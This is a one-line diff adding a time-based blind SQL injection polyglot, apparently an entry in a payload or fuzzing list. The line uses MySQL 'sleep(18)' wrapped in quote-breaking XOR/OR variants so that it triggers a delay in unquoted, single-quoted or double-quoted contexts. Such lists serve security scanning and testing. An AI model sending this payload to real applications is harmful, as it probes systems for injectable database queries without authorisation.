@@ -1,0 +1,1 @@
+if(now()=sysdate(),sleep(18),0)/*'XOR(if(now()=sysdate(),sleep(18),0))OR'"XOR(if(now()=sysdate(),sleep(18),0))OR"*/
